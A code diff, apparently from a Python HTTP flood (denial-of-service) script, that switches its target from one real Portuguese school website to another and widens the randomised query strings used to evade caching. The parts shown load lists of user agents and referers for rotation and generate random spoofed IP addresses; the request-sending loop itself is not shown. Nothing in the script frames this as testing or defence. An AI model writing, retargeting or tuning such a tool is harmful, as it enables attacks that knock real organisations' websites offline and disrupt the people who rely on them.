@@ -6,7 +6,7 @@ import time
 from urllib.parse import urlencode
 import urllib.parse
 
-target_url = "https://ecoescolas.abaae.pt/"
+target_url = "https://agrcbt.pt/"
 
 with open('useragents.txt', 'r') as file:
     user_agents = [line.strip() for line in file.readlines()]
@@ -15,8 +15,8 @@ with open('referers.txt', 'r') as file:
     referers = [line.strip() for line in file.readlines()]
 
 def generate_query_string():
-    length = random.randint(6, 27)
-    return "?" + "&".join(f"{random.choice(string.ascii_letters)}={random.randint(1, 10000)}" for _ in range(length))
+    length = random.randint(6, 37)
+    return "?" + "&".join(f"{random.choice(string.ascii_letters)}={random.randint(1, 100000)}" for _ in range(length))
 
 def generate_ip():
     blocks = [random.randint(0, 255) for _ in range(4)]
